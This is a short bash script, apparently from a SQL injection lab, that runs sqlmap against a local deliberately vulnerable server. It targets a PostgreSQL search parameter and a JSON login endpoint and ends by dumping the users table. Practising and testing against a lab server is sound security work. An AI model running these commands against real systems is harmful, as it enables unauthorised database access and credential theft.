#!/usr/bin/env bash
# Roda sqlmap contra o servidor vulneravel local.
# Requer sqlmap instalado: pip install sqlmap (ou git clone).
#
# Uso: bash scripts/run_sqlmap.sh [target_url]

TARGET="${1:-http://localhost:8000}"

echo "[sqlmap] alvo: $TARGET"
echo "[sqlmap] testando /pg/search?table=clientes&q=*"

sqlmap \
  -u "${TARGET}/pg/search?table=clientes&q=test" \
  -p q \
  --batch \
  --level=3 \
  --risk=2 \
  --technique=BEUSTQ \
  --dbms=postgresql \
  --tables \
  --random-agent

echo ""
echo "[sqlmap] testando /pg/login (POST)"
sqlmap \
  -u "${TARGET}/pg/login" \
  --data='{"username":"admin","password":"x"}' \
  --headers="Content-Type: application/json" \
  -p username \
  --batch \
  --level=3 \
  --risk=2 \
  --dbms=postgresql \
  --dump -T users
